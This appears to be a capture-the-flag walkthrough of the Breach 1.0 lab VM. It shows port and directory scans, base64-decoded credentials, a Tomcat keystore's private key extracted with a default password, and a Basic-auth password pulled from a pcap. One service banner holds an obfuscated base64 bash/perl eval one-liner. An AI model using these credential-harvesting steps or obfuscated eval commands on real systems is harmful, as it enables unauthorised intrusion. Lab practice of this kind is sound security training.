root@Blue3:~# nmap --open -p- breach1.ctf | grep ssh
22/tcp    open  ssh
614/tcp   open  sshell
830/tcp   open  netconf-ssh
3897/tcp  open  sdo-ssh
4334/tcp  open  netconf-ch-ssh
5161/tcp  open  snmpssh
5162/tcp  open  snmpssh-trap
6252/tcp  open  tl1-ssh
17235/tcp open  ssh-mgmt

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# nc breach1.ctf 22
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# nmap --open -p- breach1.ctf | grep http
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 15:30 +07
80/tcp    open  http
280/tcp   open  http-mgmt
443/tcp   open  https
488/tcp   open  gss-http
591/tcp   open  http-alt
593/tcp   open  http-rpc-epmap
623/tcp   open  oob-ws-http
777/tcp   open  multiling-http
808/tcp   open  ccproxy-http
832/tcp   open  netconfsoaphttp
1183/tcp  open  llsurfup-http
1184/tcp  open  llsurfup-https
2381/tcp  open  compaq-https
2688/tcp  open  md-cg-http
2851/tcp  open  webemshttp
3106/tcp  open  cardbox-http
3128/tcp  open  squid-http
3227/tcp  open  dwnmshttp
3816/tcp  open  sunlps-http
4035/tcp  open  wap-push-http
4036/tcp  open  wap-push-https
4180/tcp  open  httpx
4848/tcp  open  appserv-http
4849/tcp  open  appserv-https
5554/tcp  open  sgi-esphttp
5800/tcp  open  vnc-http
5801/tcp  open  vnc-http-1
5802/tcp  open  vnc-http-2
5803/tcp  open  vnc-http-3
5988/tcp  open  wbem-http
5989/tcp  open  wbem-https
5990/tcp  open  wbem-exp-https
6443/tcp  open  sun-sr-https
6480/tcp  open  sun-sr-http
6770/tcp  open  plysrv-http
6771/tcp  open  plysrv-https
6788/tcp  open  smc-http
6842/tcp  open  netmo-http
7443/tcp  open  oracleas-https
7627/tcp  open  soap-http
7677/tcp  open  sun-user-https
8000/tcp  open  http-alt
8008/tcp  open  http
8080/tcp  open  http-proxy
8088/tcp  open  radan-http
8243/tcp  open  synapse-nhttps
8280/tcp  open  synapse-nhttp
8443/tcp  open  https-alt
8444/tcp  open  pcsync-http
8765/tcp  open  ultraseek-http
8910/tcp  open  manyone-http
8990/tcp  open  http-wmap
8991/tcp  open  https-wmap
9294/tcp  open  armcenterhttp
9295/tcp  open  armcenterhttps
9443/tcp  open  tungsten-https
9762/tcp  open  tungsten-http
16992/tcp open  amt-soap-http
16993/tcp open  amt-soap-https
20002/tcp open  commtact-http
20003/tcp open  commtact-https
24680/tcp open  tcc-http
27504/tcp open  kopek-httphead

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# nmap -sC -sV -A -oA NmapFull -p22,80,443,614,8080,8443,17235 breach1.ctf
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 15:34 +07
Nmap scan report for breach1.ctf (192.168.110.140)
Host is up (0.00061s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh?
| fingerprint-strings:
|   NULL:
|_    550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
80/tcp    open  http          Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to Breach 1.0
443/tcp   open  login         Microsoft Windows Services for Unix logind
614/tcp   open  ident         Ident2
8080/tcp  open  http-proxy?
| fingerprint-strings:
|   NULL:
|_    /bin/bash -c {perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==} $_=$ARGV[0];~s/SPACE/ /ig;eval;$_=$ARGV[1];eval(decode_base64($_));
8443/tcp open  ssl/https-alt?
|_ssl-date: 2020-09-15T14:31:35+00:00; +6h59m59s from scanner time.
17235/tcp open  ssl/ssh-mgmt?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.80%I=7%D=9/14%Time=5F5F2B1A%P=x86_64-pc-linux-gnu%r(NULL
SF:,41,"550\x2012345\x200f8008c008fff8000000000000780000007f80008770800080
SF:0ff00");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.80%I=7%D=9/14%Time=5F5F2B1B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,EC,"/bin/bash\t-c\t{perl,-e,\$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkV
SF:EXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcm
SF:VjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==}\t\$_=\$ARGV\[0\];~s/SPACE/\\t/ig;ev
SF:al;\$_=\$ARGV\[1\];eval\(decode_base64\(\$_\)\);");
MAC Address: 08:00:27:DB:6F:91 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.16 (96%), Linksys EA3500 WAP (96%), Linux 4.4 (93%), Linux 3.2 - 4.9 (92%), Linux 2.6.18 - 2.6.32 (90%), Linux 3.10 - 4.11 (89%), Linux 3.13 (89%), Android 4.0 (88%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (88%), Linux 4.10 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms breach1.ctf (192.168.110.140)

Host script results:
|_clock-skew: 6h59m58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.20 seconds

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:.../eblue3# webdirscan --url=http://breach1.ctf
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://breach1.ctf
[+] Threads:        30
[+] Wordlist:       /media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/WEB/big
[+] Status codes:   200,204,301,302,307
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,config,cfg,cgi,html
[+] Timeout:        10s
===============================================================
2020/09/14 17:35:21 Starting gobuster
===============================================================
/images (Status: 301)
/index.html (Status: 200)
/impresscms (Status: 301)
/initech.html (Status: 200)
/.keystore (Status: 200)
===============================================================
2020/09/14 17:35:53 Finished
===============================================================

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:.../eblue3# webdirscan --url=http://breach1.ctf/impresscms
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://breach1.ctf/impresscms
[+] Threads:        30
[+] Wordlist:       /media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/WEB/big
[+] Status codes:   200,204,301,302,307
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt,config,cfg,cgi
[+] Timeout:        10s
===============================================================
2020/09/14 17:36:29 Starting gobuster
===============================================================
/admin.php (Status: 302)
/banners.php (Status: 200)
/cache (Status: 301)
/class (Status: 301)
/content.php (Status: 302)
/editors (Status: 301)
/favicon.ico (Status: 200)
/error.php (Status: 302)
/footer.php (Status: 200)
/header.php (Status: 200)
/help.html (Status: 200)
/htaccess.txt (Status: 200)
/image.php (Status: 200)
/images (Status: 301)
/include (Status: 301)
/kernel (Status: 301)
/language (Status: 301)
/libraries (Status: 301)
/lostpass.php (Status: 302)
/invite.php (Status: 200)
/modules (Status: 301)
/misc.php (Status: 200)
/index.html (Status: 200)
/index.php (Status: 200)
/notifications.php (Status: 302)
/plugins (Status: 301)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/register.php (Status: 302)
/search.php (Status: 200)
/suggest.php (Status: 200)
/templates_c (Status: 301)
/themes (Status: 301)
/uploads (Status: 301)
/user.php (Status: 200)
/userinfo.php (Status: 302)
/xmlrpc.php (Status: 200)
===============================================================
2020/09/14 17:36:52 Finished
===============================================================

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

Download the suspected image: bill.png (Hint: "Look at the source code")

root@Blue3:.../Breach1# exiftool bill.png
ExifTool Version Number         : 12.06
File Name                       : bill.png
Directory                       : .
File Size                       : 315 kB
File Modification Date/Time     : 2020:09:15 16:01:36+07:00
File Access Date/Time           : 2020:09:15 16:01:36+07:00
File Inode Change Date/Time     : 2020:09:15 16:01:36+07:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 610
Image Height                    : 327
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Comment                         : coffeestains
Image Size                      : 610x327
Megapixels                      : 0.199

=> coffeestains ?

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

view-source:http://breach1.ctf/index.html:
...
<!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->

</body>
...

=>
root@Blue3:.../eblue3# echo "Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo" | base64 -d
cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh
root@Blue3:.../eblue3# echo "cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh" | base64 -d
pgibbons:damnitfeel$goodtobeagang$ta

ID / Pass? Great!
pgibbons / damnitfeel$goodtobeagang$ta
=> Login to http://192.168.110.140/impresscms/user.php

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

=> On Inbox: http://192.168.110.140/impresscms/readpmsg.php?start=0&total_messages=3

FWD: Thank you for your purchase of Super Secret Cert Pro!
Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob
-------------------------------------------------------------------------------------------------------------------------------------------
From: registrar@penetrode.com
Sent: 02 June 2016 16:16
To: bob@initech.com; admin@breach.local
Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!

=> http://192.168.110.140/impresscms/search.php?query=ssl&andor=OR&mids%5B%5D=3&mids%5B%5D=4&submit=Search&action=results&id_REQUEST=4949a09afd22f06e8442448d7078f2a2
=>
Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)
Team - I have uploaded a pcap file of our red team's re-production of the attack.
I am not sure what trickery they were using but I cannot read the file.
I tried every nmap switch from my C|EH studies and just cannot figure it out.
http://192.168.110.140/impresscms/_SSL_test_phase1.pcap
They told me the alias, storepassword and keypassword are all set to 'tomcat'.
Is that useful?? Does anyone know what this is?
I guess we are securely encrypted now? -Peter
p.s. I'm going fishing for the next 2 days and will not have access to email or phone.

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:.../Breach1# keytool -importkeystore -srckeystore keystore -srcstorepass tomcat -srckeypass tomcat -srcalias tomcat -destalias tomcat -destkeystore keystore.p12 -deststoretype PKCS12
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Importing keystore keystore to keystore.p12...
Enter destination keystore password: tomcat
Re-enter new password: tomcat
root@Blue3:.../Breach1# dlist
total 72
drwxr-xr-x 21 root root  4096 Sep 14 16:08 ..
-rw-r--r--  1 root root  2245 Sep 14 17:51 keystore
-rw-r--r--  1 root root 41412 Sep 14 17:59 _SSL_test_phase1.pcap
-rw-r--r--  1 root root 12233 Sep 15 14:34 reconemu.txt
-rw-r--r--  1 root root  2583 Sep 15 14:37 keystore.p12
drwxr-xr-x  2 root root  4096 Sep 15 14:37 .

root@Blue3:.../Breach1# openssl pkcs12 -in keystore.p12 -nodes -nocerts -out private_key.pem
Enter Import Password: tomcat

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:.../Breach1# keytool -export -alias tomcat -keystore keystore -rfc -file keystore.crt
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Enter keystore password: tomcat
Certificate stored in file <keystore.crt>

Warning:
The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using "keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12".

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

On pcap-stream.txt:
...
GET /_M@nag3Me/html HTTP/1.1
Host: 192.168.110.140:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
Connection: keep-alive
Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Pragma: No-cache
Cache-Control: no-cache
Expires: Wed, 31 Dec 1969 19:00:00 EST
Set-Cookie: JSESSIONID=D7A894398479A598FA50BCCEA3AFCFAD; Path=/_M%40nag3Me; Secure
Content-Type: text/html;charset=utf-8
Transfer-Encoding: chunked
Date: Sat, 04 Jun 2016 16:56:51 GMT
...

=> Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
root@Blue3:~# echo "dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC" | base64 -d
tomcat:Tt\5D8F(#!*u=G)4m7zB
=> So we have the login for Tomcat Dashboard https://breach1.ctf:8443/_M@nag3Me/html, but we need the Certificate for going in.
=> Logged in with Burp Suite help.
